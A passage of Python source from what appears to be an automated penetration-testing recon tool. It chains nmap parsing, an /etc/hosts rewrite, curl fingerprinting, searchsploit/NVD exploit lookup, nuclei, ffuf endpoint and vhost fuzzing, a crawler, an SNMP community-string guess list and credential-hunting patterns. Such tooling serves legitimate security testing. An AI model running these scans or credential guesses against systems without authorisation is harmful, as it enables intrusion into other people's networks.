            fd = target_ip
            if fd not in web_map:
                web_map[fd] = {"ports": set(), "schemes": set()}
            scheme = "http"
            if re.search(r"\bhttps\b|\bssl/http\b|\bssl\b", pll):
                scheme = "https"
            elif re.search(r"Subject:\s*commonName=|SSL certificate", block, re.I):
                scheme = "https"
            web_map[fd]["ports"].add(port)
            web_map[fd]["schemes"].add(scheme)
        for domain, scheme in candidates:
            domain = domain.lower().rstrip(".")
            if domain not in web_map:
                web_map[domain] = {"ports": set(), "schemes": set()}
            web_map[domain]["ports"].add(port)
            web_map[domain]["schemes"].add(scheme)
    for domain, data in web_map.items():
        print(f"[+] {domain} → ports: {sorted(data['ports'])}  schemes: {sorted(data['schemes'])}")
    if not web_map:
        print("[-] No web domains discovered")
    return web_map


def extract_structured_domains(content):
    domains = set()
    for pat in [r"DNS_Domain_Name:\s*(.+)", r"DNS_Computer_Name:\s*(.+)", r"DNS_Tree_Name:\s*(.+)"]:
        for m in re.findall(pat, content):
            d = m.strip().lower().rstrip(".")
            if is_valid_domain(d):
                domains.add(d)
    for dc in re.findall(r"defaultNamingContext:\s*(DC=.*)", content):
        parts = re.findall(r"DC=([^,]+)", dc)
        if parts:
            domains.add(".".join(parts).lower())
    for cn in re.findall(r"Subject: commonName=([^\n]+)", content):
        cn = cn.strip().lower().rstrip(".")
        if is_valid_domain(cn):
            domains.add(cn)
    for san in re.findall(r"DNS:([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", content):
        domains.add(san.lower())
    for rd in re.findall(r"http[s]?://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", content):
        domains.add(rd.lower())
    for sd in re.findall(r"\(domain:([^)]+)\)", content):
        sd = sd.lower().rstrip(".")
        if is_valid_domain(sd):
            domains.add(sd)
    return domains


def build_global_domain_list(ad_core, web_map, nmap_full_output):
    domains = set()
    if ad_core:
        if ad_core.get("dns_domain"):
            domains.add(ad_core["dns_domain"].lower().rstrip("."))
        for h in ad_core.get("dc_hosts") or set():
            domains.add(h.lower().rstrip("."))
    domains.update(web_map.keys())
    if os.path.exists(nmap_full_output):
        with open(nmap_full_output, "r", errors="ignore") as f:
            content = f.read()
        domains.update(extract_structured_domains(strip_traceroute_blocks(content)))
    domains = {d for d in domains if is_valid_domain(d)}
    print("\n=== GLOBAL DOMAIN LIST ===")
    for d in sorted(domains):
        print(f"[+] {d}")
    return domains


def update_hosts_file(target_ip, domains):
    hosts_path = "/etc/hosts"
    print("\n[+] Updating /etc/hosts...\n")
    domains = {d.lower() for d in domains}
    try:
        with open(hosts_path, "r") as f:
            lines = f.readlines()
    except Exception as e:
        print(red(f"[!] Cannot read hosts file: {e}"))
        return
    updated = []
    to_add  = set(domains)
    for line in lines:
        stripped = line.strip()
        if stripped.startswith("#") or not stripped:
            updated.append(line)
            continue
        parts = stripped.split()
        existing = parts[1:]
        replaced = False
        for d in existing:
            if d.lower() in domains:
                updated.append(f"{target_ip} {d.lower()}\n")
                to_add.discard(d.lower())
                replaced = True
                break
        if not replaced:
            updated.append(line)
    for d in to_add:
        updated.append(f"{target_ip} {d}\n")
    subprocess.run(["sudo", "tee", hosts_path],
                   input="".join(updated), text=True, stdout=subprocess.DEVNULL)
    print(f"{white('[+] /etc/hosts updated.')}")


# ============================================================
# WEB – VALIDATION
# ============================================================

def validate_web_target(scheme, target_ip, host, port):
    """
    Validate web target using http_code write-out.
    - Always uses --resolve to force domain→IP mapping for both HTTP and HTTPS.
    - This handles redirect chains correctly: if server redirects http://IP → http://domain/
      curl will still connect to target_ip instead of doing DNS lookup.
    - Works without /etc/hosts being updated.
    """
    # --resolve forces curl to use target_ip for this host on both ports 80 and 443
    resolve_http  = f"{host}:80:{target_ip}"
    resolve_https = f"{host}:443:{target_ip}"

    if scheme == "http":
        cmd = ["curl", "-s", "-o", "/dev/null",
               "-w", "%{http_code}",
               "--max-time", "8", "--connect-timeout", "3",
               "-L", "-k",
               "--resolve", resolve_http,
               "--resolve", resolve_https,
               f"http://{host}:{port}"]
    else:
        cmd = ["curl", "-s", "-o", "/dev/null",
               "-w", "%{http_code}",
               "--max-time", "8", "--connect-timeout", "3",
               "-L", "-k",
               "--resolve", resolve_http,
               "--resolve", resolve_https,
               f"https://{host}:{port}"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    code = result.stdout.strip()
    try:
        return result.returncode == 0 and int(code) > 0
    except ValueError:
        return False


def build_validated_web_targets(web_map, target_ip):
    print("\n[+] Validating web services...\n")
    validated = []
    for host, data in web_map.items():
        is_domain = not is_ipv4_address(host)
        for port in data["ports"]:
            for scheme in data["schemes"]:
                # Show both domain and IP so it's clear what's happening
                if is_domain:
                    print(f"[CHECK] {scheme}://{host}:{port}  (via {target_ip})")
                else:
                    print(f"[CHECK] {scheme}://{host}:{port}")
                if validate_web_target(scheme, target_ip, host, port):
                    print(f"  {green('[+]')} Valid")
                    validated.append({
                        "host": host, "port": port, "scheme": scheme,
                        "is_domain": is_domain, "supports_vhost_enum": is_domain
                    })
                else:
                    print(f"  {red('[-]')} Not responding")
    return validated


# ============================================================
# WEB – HTTP HELPER
# ============================================================

def fetch_url(target, target_ip, path="/", head=False):
    scheme = target["scheme"]
    host   = target["host"]
    port   = target["port"]
    method = "-I" if head else ""
    if scheme == "http":
        cmd = ["curl", "-s", "-k", method,
               "-H", f"Host: {host}",
               f"http://{target_ip}:{port}{path}"]
    else:
        cmd = ["curl", "-s", "-k", method,
               "--resolve", f"{host}:{port}:{target_ip}",
               f"https://{host}:{port}{path}"]
    cmd = [c for c in cmd if c]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout


# ============================================================
# WEB – EXTENDED FINGERPRINTING (NEW)
# ============================================================

def fingerprint_web_target(target, target_ip):
    """
    Extended fingerprinting:
      • Server / X-Powered-By header extraction
      • Cookie security flag analysis
      • JWT detection in headers/cookies
      • Technology hints from body
      • CMS detection
    """
    fp = {
        "cms": {"is_cms": False},
        "server": None,
        "x_powered_by": None,
        "tech_hints": [],
        "cookie_issues": [],
        "jwt_found": False,
    }

    raw_headers = fetch_url(target, target_ip, path="/", head=True)
    body        = fetch_url(target, target_ip, path="/")

    # --- Header parsing ---
    for line in raw_headers.splitlines():
        ll = line.lower()
        if ll.startswith("server:"):
            fp["server"] = line.split(":", 1)[1].strip()
        elif ll.startswith("x-powered-by:"):
            fp["x_powered_by"] = line.split(":", 1)[1].strip()
        elif ll.startswith("set-cookie:"):
            val = line.split(":", 1)[1].strip()
            issues = []
            if "httponly" not in ll:
                issues.append("HttpOnly missing")
            if "secure" not in ll:
                issues.append("Secure missing")
            if "samesite" not in ll:
                issues.append("SameSite missing")
            if issues:
                fp["cookie_issues"].append(f"{', '.join(issues)} → {val[:80]}")
            if re.search(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.", val):
                fp["jwt_found"] = True

    # JWT anywhere in headers
    if re.search(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.", raw_headers):
        fp["jwt_found"] = True

    # --- CMS detection ---
    fp["cms"] = _detect_cms(raw_headers, body, target, target_ip)

    # --- Technology hints ---
    TECH_PATTERNS = [
        ("wp-content", "WordPress assets"),
        ("drupal", "Drupal"),
        ("joomla", "Joomla"),
        ("laravel", "Laravel"),
        ("ruby on rails", "Ruby on Rails"),
        ("django", "Django"),
        ("flask", "Flask"),
        ("powered by php", "PHP"),
        ("jquery", "jQuery"),
        ("react", "React"),
        ("angular", "Angular"),
        ("vue", "Vue.js"),
        ("asp.net", "ASP.NET"),
        ("express", "Express.js"),
    ]
    body_lower = body.lower()
    for keyword, label in TECH_PATTERNS:
        if keyword in body_lower:
            fp["tech_hints"].append(label)

    # --- Print summary ---
    host = target["host"]
    port = target["port"]
    print(f"\n  {white('[ FINGERPRINT ]')} {host}:{port}")
    if fp["server"]:
        print(f"    Server       : {fp['server']}")
    if fp["x_powered_by"]:
        print(f"    X-Powered-By : {fp['x_powered_by']}")
    if fp["cms"].get("is_cms"):
        print(f"    CMS          : {fp['cms']['cms_type']} ({fp['cms']['confidence']})")
    if fp["tech_hints"]:
        print(f"    Tech         : {', '.join(set(fp['tech_hints']))}")
    if fp["jwt_found"]:
        print(f"    {green('JWT')}          : Detected – test alg:none / weak secret")
    for ci in fp["cookie_issues"]:
        print(f"    Cookie       : {ci}")

    return fp


def _detect_cms(headers, body, target, target_ip):
    ev = {"wordpress": 0, "drupal": 0, "joomla": 0}
    if "X-Pingback" in headers:
        ev["wordpress"] += 1
    if "X-Generator: Drupal" in headers:
        ev["drupal"] += 2
    if "Joomla" in headers:
        ev["joomla"] += 1
    if 'content="WordPress' in body:
        return {"is_cms": True, "cms_type": "wordpress", "confidence": "high"}
    if 'content="Drupal' in body:
        return {"is_cms": True, "cms_type": "drupal",    "confidence": "high"}
    if 'content="Joomla' in body:
        return {"is_cms": True, "cms_type": "joomla",    "confidence": "high"}
    for path, status_ok, key in [
        ("/wp-login.php",     ("200", "302"), "wordpress"),
        ("/wp-content/",      ("200", "403"), "wordpress"),
        ("/core/",            ("200",),       "drupal"),
        ("/sites/default/",   ("200", "403"), "drupal"),
        ("/administrator/",   ("200", "302"), "joomla"),
    ]:
        resp = fetch_url(target, target_ip, path, head=True)
        if any(s in resp for s in status_ok):
            ev[key] += 1
    best = max(ev, key=ev.get)
    if ev[best] >= 2:
        return {"is_cms": True, "cms_type": best, "confidence": "medium"}
    return {"is_cms": False}


# Legacy shim (used by scan_web_targets when nuclei is off)
def detect_cms(target, target_ip):
    print(f"[*] CMS detection: {target['host']}")
    h = fetch_url(target, target_ip, path="/", head=True)
    b = fetch_url(target, target_ip)
    return _detect_cms(h, b, target, target_ip)



# ============================================================
# CVE LOOKUP – searchsploit + NVD API
# ============================================================

def _parse_server_version(server_header):
    """
    Extract product+version pairs from a Server header.
    e.g. 'Apache/2.4.58 (Ubuntu)' → [('Apache', '2.4.58')]
         'nginx/1.18.0'            → [('nginx', '1.18.0')]
    """
    tokens = []
    for part in server_header.split():
        m = re.match(r'^([A-Za-z][A-Za-z0-9_.-]+)/([0-9][0-9A-Za-z._-]*)$', part)
        if m:
            product = m.group(1)
            version = m.group(2)
            # Skip generic suffixes like (Ubuntu)
            if product.lower() not in {"openssl", "mod_ssl"}:
                tokens.append((product, version))
    return tokens


def _searchsploit_lookup(product, version):
    """
    Run searchsploit for product+version, return list of result lines.
    """
    if not check_tool("searchsploit"):
        return []
    query = f"{product} {version}"
    result = subprocess.run(
        ["searchsploit", "--colour", "-t", query],
        capture_output=True, text=True, timeout=15
    )
    lines = []
    for line in result.stdout.splitlines():
        # Skip header/separator lines
        if line.startswith("-") or line.startswith("Exploit") or not line.strip():
            continue
        lines.append(line.strip())
    return lines


def _nvd_lookup(product, version):
    """
    Query NVD CVE API v2 for a product+version.
    Returns list of (cve_id, cvss_score, description) tuples.
    Caps at 5 results to avoid noise.
    """
    try:
        import urllib.request, urllib.parse
        keyword = f"{product} {version}"
        params  = urllib.parse.urlencode({
            "keywordSearch": keyword,
            "resultsPerPage": 5,
        })
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?{params}"
        req = urllib.request.Request(url, headers={"User-Agent": "BoberAutoScanner/2.0"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read())
        results = []
        for item in data.get("vulnerabilities", []):
            cve   = item.get("cve", {})
            cve_id = cve.get("id", "?")
            # CVSS v3 score
            score = "?"
            metrics = cve.get("metrics", {})
            for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                if key in metrics and metrics[key]:
                    score = metrics[key][0].get("cvssData", {}).get("baseScore", "?")
                    break
            # Description (English)
            desc = ""
            for d in cve.get("descriptions", []):
                if d.get("lang") == "en":
                    desc = d.get("value", "")[:120]
                    break
            results.append((cve_id, str(score), desc))
        return results
    except Exception:
        return []


def run_cve_lookup(fingerprint):
    """
    Given a fingerprint dict from fingerprint_web_target(),
    run searchsploit + NVD lookup for detected server/tech versions.
    Prints findings and saves to cve_hints.txt.
    """
    server = fingerprint.get("server") or ""
    xpb    = fingerprint.get("x_powered_by") or ""
    hints  = fingerprint.get("tech_hints") or []

    targets = []
    for hdr in [server, xpb]:
        if hdr:
            targets.extend(_parse_server_version(hdr))

    # Also try tech hints that look like "product/version" or "product version"
    for hint in hints:
        m = re.match(r'^([A-Za-z][A-Za-z0-9_.-]+)[/ ]([0-9][0-9A-Za-z._-]*)$', hint)
        if m:
            targets.append((m.group(1), m.group(2)))

    if not targets:
        print("[*] CVE lookup: no versioned software detected in headers.")
        return

    all_findings = []

    for product, version in targets:
        print(f"\n{yellow('[CVE]')} Searching for: {cyan(product)} {version}")

        # --- searchsploit ---
        ss_results = _searchsploit_lookup(product, version)
        if ss_results:
            print(f"  {green('[searchsploit]')} Found {len(ss_results)} entries:")
            for line in ss_results[:5]:
                # Extract EDB-ID from searchsploit line if present (format: "... | /path/to/exploit.txt  EDB-ID")
                edb_id = None
                m = re.search(r'(\d{4,6})\s*$', line)
                if not m:
                    # Try to extract from path like exploits/linux/remote/12345.py
                    m = re.search(r'/(\d{4,6})\.\w+', line)
                if m:
                    edb_id = m.group(1)
                edb_url = f"  → https://www.exploit-db.com/exploits/{edb_id}" if edb_id else ""
                print(f"    {line}")
                if edb_url:
                    print(f"    {cyan(edb_url)}")
                all_findings.append(f"[searchsploit] {product} {version}: {line}")
                if edb_url:
                    all_findings.append(f"               {edb_url.strip()}")
        else:
            print(f"  {white('[searchsploit]')} No entries found.")

        # --- NVD API ---
        nvd_results = _nvd_lookup(product, version)
        if nvd_results:
            print(f"  {green('[NVD]')} Found {len(nvd_results)} CVE(s):")
            for cve_id, score, desc in nvd_results:
                nvd_url  = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
                mitre_url = f"https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve_id}"
                print(f"    {red(cve_id)} [CVSS: {score}]  {desc}")
                print(f"      {cyan('NVD  →')} {nvd_url}")
                print(f"      {cyan('MITRE→')} {mitre_url}")
                all_findings.append(
                    f"[NVD] {cve_id} CVSS:{score} {product} {version}: {desc}\n"
                    f"      NVD:   {nvd_url}\n"
                    f"      MITRE: {mitre_url}"
                )
        else:
            print(f"  {white('[NVD]')} No CVEs found.")

    if all_findings:
        out = "cve_hints.txt"
        with open(out, "w") as f:
            f.write("\n".join(all_findings) + "\n")
        print(f"\n{magenta('[REPORT]')} CVE hints → {out}")


# ============================================================
# WEB – NUCLEI (NEW)
# ============================================================

def _find_nuclei_templates_dir():
    """
    Resolve the nuclei templates directory.
    Checks common locations in order:
      1. ~/.local/nuclei-templates  (nuclei default since v3)
      2. ~/nuclei-templates
      3. /root/nuclei-templates
    Returns the path string or None if not found.
    """
    candidates = [
        os.path.expanduser("~/.local/nuclei-templates"),
        os.path.expanduser("~/nuclei-templates"),
        "/root/nuclei-templates",
    ]
    for p in candidates:
        if os.path.isdir(p):
            return p
    return None


def run_nuclei_scan(target, target_ip):
    if not check_tool("nuclei"):
        warn_missing_tool("nuclei")
        return

    scheme = target["scheme"]
    host   = target["host"]
    port   = target["port"]
    url    = f"http://{target_ip}:{port}" if scheme == "http" else f"https://{host}:{port}"
    extra  = ["-H", f"Host: {host}"] if scheme == "http" else []
    out    = f"{host}_{port}_nuclei.txt"

    # Resolve template directory
    tmpl_dir = _find_nuclei_templates_dir()
    if not tmpl_dir:
        print(f"{yellow('[NUCLEI]')} Templates not found. Run: nuclei -update-templates")
        return

    # nuclei v3 moved templates under http/ subdirectory
    # Try both v2 (cves/) and v3 (http/cves/) paths
    CATEGORIES = [
        "cves", "misconfiguration", "exposures", "default-logins",           # v2
        "http/cves", "http/misconfiguration", "http/exposures",               # v3
        "http/default-logins", "http/technologies",                           # v3
    ]
    tmpl_args = []
    seen = set()
    for cat in CATEGORIES:
        cat_path = os.path.join(tmpl_dir, cat)
        if os.path.isdir(cat_path) and cat_path not in seen:
            tmpl_args += ["-t", cat_path]
            seen.add(cat_path)

    if not tmpl_args:
        print(f"{yellow('[NUCLEI]')} No template categories found in {tmpl_dir}")
        print(f"  {yellow('[HINT]')} Run: nuclei -update-templates")
        return

    print(f"\n{yellow('[NUCLEI]')} Scanning {url}  ({host})")
    print(f"  Templates: {tmpl_dir}")
    cmd = [
        "nuclei", "-u", url,
    ] + tmpl_args + [
        "-severity", "critical,high,medium",
        "-silent", "-o", out,
        "-timeout", "5", "-retries", "1",
    ] + extra

    print(f"{cyan('[CMD]')} {' '.join(cmd)}")
    run_interruptible_command(cmd, "NUCLEI")
    if os.path.exists(out) and os.path.getsize(out) > 0:
        print(f"{green('[LOOT]')} Nuclei findings → {out}")
        with open(out) as f:
            for line in f:
                print(f"  {yellow('>>>')} {line.rstrip()}")
    else:
        print("[*] Nuclei: no findings.")


# ============================================================
# WEB – CRAWLER
# ============================================================

def run_web_crawler(target, target_ip, auto_mode,
                    seed_json_file=None,
                    crawler_active_mode=False,
                    crawler_check_vulnerabilities=False):
    if not check_tool("bober-crawler"):
        warn_missing_tool("bober-crawler")
        return
    scheme  = target["scheme"]
    host    = target["host"]
    port    = target["port"]
    base_url = f"{scheme}://{host}:{port}"
    print(f"\n{white('[CRAWLER]')} Target: {base_url}")
    print("[*] The crawler will automatically use endpoint fuzzing results as seed input when available.")
    use_proxy = ask_user("Route through Burp proxy (127.0.0.1:8080)? [y/N]: ",
                         default="yes", auto_mode=auto_mode)
    cmd = ["bober-crawler", "--start-url", f"{base_url}/", "--scope", base_url,
           "--debug-level", "1"]
    if seed_json_file:
        cmd += ["--seed-json-file", seed_json_file]
    if crawler_active_mode:
        cmd.append("--active-mode")
    if crawler_check_vulnerabilities:
        cmd.append("--check-vulnerabilities")
    if not use_proxy:
        cmd.append("--no-proxy")
    print(f"{cyan('[CMD]')} {' '.join(cmd)}")
    run_interruptible_command(cmd, "CRAWLER")


def can_resolve_host(host):
    try:
        addrinfo = socket.getaddrinfo(host, None)
        resolved_ips = sorted({
            entry[4][0]
            for entry in addrinfo
            if entry and len(entry) > 4 and entry[4]
        })
        return True, resolved_ips
    except socket.gaierror:
        return False, []
    except Exception:
        return False, []


# ============================================================
# WEB – BASELINE MEASUREMENT (REFACTORED)
# ============================================================

def _ffuf_word_count(body):
    """
    Mirror ffuf word counting as closely as possible.
    ffuf splits the response body on a literal single space character.
    """
    return str(len(body.split(" ")))


def _curl_probe(target, target_ip, host_header, url):
    """Single curl probe → (status, words) or None."""
    scheme = target["scheme"]
    host   = target["host"]
    port   = target["port"]
    marker = "__BOBER_STATUS__:"
    if scheme == "http":
        cmd = ["curl", "-s", "-k", "--compressed",
               "-w", f"\n{marker}%{{http_code}}",
               "-H", host_header, url]
    else:
        cmd = ["curl", "-s", "-k", "--compressed",
               "-w", f"\n{marker}%{{http_code}}",
               "--resolve", f"{host}:{port}:{target_ip}",
               "-H", host_header, url]
    r = subprocess.run(cmd, capture_output=True)
    if not r.stdout:
        return None
    raw = r.stdout
    marker_bytes = marker.encode()
    idx = raw.rfind(marker_bytes)
    if idx == -1:
        return None
    body = raw[:idx]
    status = raw[idx + len(marker_bytes):].strip().decode("ascii", errors="ignore")
    if not status:
        return None
    return (status, _ffuf_word_count(body.decode("latin-1")))


def get_endpoint_baseline(target, target_ip):
    print("[*] Calculating endpoint baseline...")
    scheme = target["scheme"]
    host   = target["host"]
    port   = target["port"]
    results = []
    for _ in range(3):
        token = ''.join(random.choices(string.ascii_lowercase, k=12))
        url   = (f"http://{target_ip}:{port}/{token}" if scheme == "http"
                 else f"https://{host}:{port}/{token}")
        r = _curl_probe(target, target_ip, f"Host: {host}", url)
        if r:
            results.append(r)
    if len(results) < 3:
        print("[-] Endpoint baseline unstable.")
        return None
    if len(set(results)) == 1:
        print(f"[+] Stable endpoint baseline: {results[0]}")
        return results[0]
    print("[*] No stable endpoint baseline.")
    return None


# Redirect status codes that must NEVER be filtered in vhost enum.
# A real vhost commonly responds with 301/302 on /, so filtering these
# would silently discard valid findings.
REDIRECT_CODES = {"301", "302", "307", "308"}


def get_vhost_baseline(target, target_ip):
    """
    Measure the baseline response for random non-existent subdomains.
    Returns a dict:
      {
        "words":  str,           # response word count to filter (-fw)
        "status": str | None,    # status code to filter (-fc), None if redirect
      }
    IMPORTANT: redirect status codes (301/302/307/308) are NEVER added to -fc
    because real vhosts commonly redirect on / and would be silently discarded.
    Only the response WORD COUNT is used as filter in that case.
    """
    print("[*] Calculating vhost baseline...")
    scheme = target["scheme"]
    host   = target["host"]
    port   = target["port"]
    results = []
    for _ in range(3):
        sub = ''.join(random.choices(string.ascii_lowercase, k=12))
        url = (f"http://{target_ip}:{port}" if scheme == "http"
               else f"https://{host}:{port}")
        r = _curl_probe(target, target_ip, f"Host: {sub}.{host}", url)
        if r:
            results.append(r)
    if len(results) < 3:
        print("[-] Vhost baseline unstable.")
        return None
    if len(set(results)) == 1:
        status, words = results[0]
        if status in REDIRECT_CODES:
            print(f"[+] Stable vhost baseline: status={status} words={words}")
            print(f"  {yellow('[!]')} Baseline is a redirect ({status}) – using word-count-only filter to avoid missing real vhosts")
            return {"words": words, "status": None}
        print(f"[+] Stable vhost baseline: status={status} words={words}")
        return {"words": words, "status": status}
    print("[*] No stable vhost baseline.")
    return None


# ============================================================
# WEB – ENDPOINT FUZZING
# ============================================================

def parse_ffuf_endpoint_results(json_file):
    try:
        with open(json_file) as f:
            data = json.load(f)
    except Exception:
        print(red("[-] Failed to parse ffuf endpoint output."))
        return
    results = data.get("results", [])
    print(f"{white('[FUZZ]')} Endpoint JSON output saved to {json_file}")
    if not results:
        print(f"{white('[FUZZ]')} No endpoints found.")
        return
    print(f"\n{white('[FUZZ]')} Discovered endpoints:")
    paths = set()
    for e in results:
        path   = e.get("input", {}).get("FUZZ", "")
        status = e.get("status")
        clean  = path.lstrip("/")
        paths.add(clean)
        print(f"  - /{clean}  (status: {status})")
    txt = json_file.replace(".json", ".txt")
    with open(txt, "w") as f:
        f.write("\n".join(sorted(paths)) + "\n")
    print(f"{white('[FUZZ]')} Wordlist → {txt}")


def run_endpoint_fuzzing(target, target_ip, wordlist):
    if not wordlist:
        print(f"{white('[FUZZ]')} No endpoint wordlist provided. Continuing without endpoint fuzzing seed input.")
        return None
    if not check_tool("ffuf"):
        warn_missing_tool("ffuf")
        return None
    scheme = target["scheme"]
    host   = target["host"]
    port   = target["port"]
    print(f"\n{white('[FUZZ]')} Endpoint fuzzing: {host}")
    baseline    = get_endpoint_baseline(target, target_ip)
    output_base = f"{host}_{port}_endpoint"
    cmd = ["ffuf", "-w", wordlist, "-t", "20", "-timeout", "10", "-ic", "-c"]
    if scheme == "http":
        cmd += ["-u", f"http://{target_ip}:{port}/FUZZ", "-H", f"Host: {host}"]
    else:
        cmd += ["-u", f"https://{target_ip}:{port}/FUZZ",
                "-H", f"Host: {host}", "-sni", host, "-k"]
    if baseline:
        status, words = baseline
        cmd += ["-fw", words, "-fc", status]
    else:
        cmd += ["-ac"]
    cmd += ["-of", "json", "-o", f"{output_base}.json"]
    print(f"{cyan('[CMD]')} {' '.join(cmd)}")
    run_interruptible_command(cmd, "ENDPOINT FUZZ")
    parse_ffuf_endpoint_results(f"{output_base}.json")
    return f"{output_base}.json"


# ============================================================
# WEB – VHOST ENUMERATION
# ============================================================

def parse_ffuf_vhost_results(json_file, parent_target):
    new_targets = []
    seen = set()
    try:
        with open(json_file) as f:
            data = json.load(f)
    except Exception:
        print(red("[-] Failed to parse ffuf vhost output."))
        return new_targets
    for e in data.get("results", []):
        fv = e.get("input", {}).get("FUZZ")
        if not fv:
            continue
        nh = f"{fv}.{parent_target['host']}".lower()
        if nh in seen:
            continue
        seen.add(nh)
        new_targets.append({
            "host": nh, "port": parent_target["port"],
            "scheme": parent_target["scheme"],
            "is_domain": True, "supports_vhost_enum": False,
            "vhost_fuzzed": True
        })
        print(f"{green('[+]')} New vhost: {nh}")
    return new_targets


def run_vhost_enum(target, wordlist, target_ip):
    if not check_tool("ffuf"):
        warn_missing_tool("ffuf")
        return []
    scheme = target["scheme"]
    host   = target["host"]
    port   = target["port"]
    print(f"\n{white('[VHOST]')} Enumerating: {host}")
    baseline    = get_vhost_baseline(target, target_ip)
    output_base = f"{host}_{port}_vhost"
    cmd = ["ffuf", "-w", wordlist, "-t", "10", "-timeout", "10", "-ic", "-c"]
    if scheme == "http":
        cmd += ["-u", f"http://{target_ip}:{port}", "-H", f"Host: FUZZ.{host}"]
    else:
        cmd += ["-u", f"https://{target_ip}:{port}",
                "-H", f"Host: FUZZ.{host}", "-sni", host, "-k"]
    if baseline:
        # Always filter by word count
        cmd += ["-fw", baseline["words"]]
        # Only filter by status if it's NOT a redirect code
        if baseline["status"] is not None:
            cmd += ["-fc", baseline["status"]]
    else:
        cmd += ["-ac"]
    cmd += ["-of", "json", "-o", f"{output_base}.json"]
    print(f"{cyan('[CMD]')} {' '.join(cmd)}")
    run_interruptible_command(cmd, "VHOST ENUM")
    return parse_ffuf_vhost_results(f"{output_base}.json", target)


# ============================================================
# WEB – PIPELINE
# ============================================================

def expand_web_targets(validated, wordlist_for_subdomain, target_ip):
    queue      = deque(validated)
    all_targets = {}
    while queue:
        target = queue.popleft()
        tid    = build_target_identifier(target)
        if tid in all_targets:
            continue
        all_targets[tid] = target
        if wordlist_for_subdomain and target["supports_vhost_enum"]:
            for nt in run_vhost_enum(target, wordlist_for_subdomain, target_ip):
                queue.append(nt)
    return list(all_targets.values())


def scan_web_targets(final_targets, target_ip, crawler_hosts_updated,
                     wordlist_for_endpoints, auto_mode, run_nuclei, run_cve,
                     crawler_active_mode, crawler_check_vulnerabilities):
    for target in final_targets:
        tid = build_target_identifier(target)
        print_sub_section_title(f"Scanning: {tid}", "34")

        fp       = fingerprint_web_target(target, target_ip)
        cms_info = fp.get("cms", {})

        skip_aggressive = False
        if cms_info.get("is_cms"):
            print(f"{yellow('[!]')} CMS: {cms_info['cms_type']} ({cms_info['confidence']})")
            if not ask_user("Run endpoint fuzzing and web crawling anyway? [y/N]: ",
                            default="yes", auto_mode=auto_mode):
                skip_aggressive = True

        # CVE lookup always runs after fingerprint (needs version info)
        if run_cve:
            run_cve_lookup(fp)

        if run_nuclei:
            run_nuclei_scan(target, target_ip)

        if skip_aggressive:
            print("[*] Skipping aggressive modules for this target.")
            continue

        seed_json_file = run_endpoint_fuzzing(target, target_ip, wordlist_for_endpoints)

        crawler_allowed = True

        if target["is_domain"] and not crawler_hosts_updated:
            print("[*] Hosts file was not updated for domain-based crawling. Testing DNS resolution...")
            dns_ok, resolved_ips = can_resolve_host(target["host"])
            if dns_ok:
                resolved_ip_text = ", ".join(resolved_ips) if resolved_ips else "unknown addresses"
                print(f"[+] Domain resolves successfully to: {resolved_ip_text}")
                if target_ip in resolved_ips:
                    print("[+] Resolved IP list includes the target IP. Web crawler can still run.")
                else:
                    print(f"{yellow('[!]')} Resolved IP list does not include the target IP.")
                    print(f"{yellow('[!]')} The crawler may reach a different host than the intended target.")
                    if not ask_user(
                        "This domain does not resolve to the original target IP, so the crawler may reach a different host. Run web crawler anyway? [y/N]: ",
                        default="no",
                        auto_mode=auto_mode
                    ):
                        print("[*] Web crawler skipped for this domain target (resolved IPs do not include the target IP).")
                        crawler_allowed = False
            else:
                print("[*] Web crawler skipped for this domain target (no hosts update and DNS resolution failed).")
                crawler_allowed = False

        if not crawler_allowed:
            continue

        run_web_crawler(
            target,
            target_ip,
            auto_mode,
            seed_json_file=seed_json_file,
            crawler_active_mode=crawler_active_mode,
            crawler_check_vulnerabilities=crawler_check_vulnerabilities
        )


def extract_domains_from_targets(final_targets):
    return {t["host"].lower() for t in final_targets if is_valid_domain(t["host"])}


def process_web_targets(validated, wordlist_for_subdomain, target_ip,
                        wordlist_for_endpoints, auto_mode, run_nuclei=False, run_cve=False,
                        crawler_active_mode=False, crawler_check_vulnerabilities=False):
    print_sub_section_title("Expanding Web Targets (VHOST ENUM)", "34")
    final = expand_web_targets(validated, wordlist_for_subdomain, target_ip)
    print("\n[+] Final web target list:")
    for t in final:
        print(f"  - {t['scheme']}://{t['host']}:{t['port']}")

    crawler_ok = True
    domains    = extract_domains_from_targets(final)
    if domains:
        print("\n[!] The bober-crawler tool needs domain-based targets to resolve correctly.")
        print("    Updating /etc/hosts is the most reliable option for domain-based targets.")
        print("    If you skip it, the tool will still try normal DNS resolution per target before skipping the crawler.\n")
        if ask_user("Update /etc/hosts with web target domains? [y/N]: ",
                    default="yes", auto_mode=auto_mode):
            update_hosts_file(target_ip, domains)
        else:
            print("[*] Hosts update declined. Domain targets will use a DNS resolution fallback before the crawler is skipped.")
            crawler_ok = False
    else:
        print("[*] No valid domains for hosts update.")

    scan_web_targets(final, target_ip, crawler_ok,
                     wordlist_for_endpoints, auto_mode, run_nuclei, run_cve,
                     crawler_active_mode, crawler_check_vulnerabilities)


# ============================================================
# SNMP ENUMERATION
# ============================================================

SNMP_COMMUNITY_STRINGS = [
    "public", "private", "manager", "community", "admin",
    "snmp", "cisco", "monitor", "default", "internal",
    "secret", "router", "switch", "write", "read",
    "test", "backup", "network", "security", "pass",
]

# High-value OID branches to walk individually
SNMP_TARGET_OIDS = [
    ("System Info",        "1.3.6.1.2.1.1"),
    ("Network Interfaces", "1.3.6.1.2.1.2.2.1.2"),
    ("IP Addresses",       "1.3.6.1.2.1.4.20"),
    ("Routing Table",      "1.3.6.1.2.1.4.21"),
    ("ARP Table",          "1.3.6.1.2.1.4.22"),
    ("Running Processes",  "1.3.6.1.2.1.25.4.2.1.2"),
    ("Installed Software", "1.3.6.1.2.1.25.6.3.1.2"),
    ("Users",              "1.3.6.1.4.1.77.1.2.25"),
]

# Credential-hunting patterns for grep over the full dump
SNMP_CRED_PATTERNS = [
    r"(?i)password\s*[=:\s]\s*\S+",
